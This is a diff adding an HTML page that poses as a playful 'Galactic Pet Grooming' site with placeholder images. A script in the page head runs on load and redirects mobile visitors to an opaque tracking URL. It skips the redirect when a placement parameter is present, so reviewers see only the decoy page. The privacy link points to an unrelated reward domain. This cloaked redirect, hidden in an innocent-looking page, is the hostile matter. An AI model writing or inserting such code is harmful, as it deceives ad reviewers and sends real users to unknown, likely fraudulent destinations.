@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Pet Grooming</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: rgba(255, 255, 255, 0.7);
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        section {
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            margin: 10px;
+            padding: 20px;
+            width: 300px;
+        }
+        footer {
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000000;
+        }
+        img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Galactic Pet Grooming</h1>
+    </header>
+    <main>
+        <section>
+            <h2>Alien Dog Wash</h2>
+            <img src="https://placeholder.com/300x200" alt="Alien Dog">
+            <p>Give your extraterrestrial pooch a cosmic clean!</p>
+        </section>
+        <section>
+            <h2>Martian Cat Styling</h2>
+            <img src="https://placeholder.com/300x200" alt="Martian Cat">
+            <p>Purr-fect looks for your feline friends from Mars!</p>
+        </section>
+        <section>
+            <h2>Space Hamster Habitat Cleaning</h2>
+            <img src="https://placeholder.com/300x200" alt="Space Hamster">
+            <p>Keep your hamster's UFO spotless and comfortable!</p>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2023 Galactic Pet Grooming | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
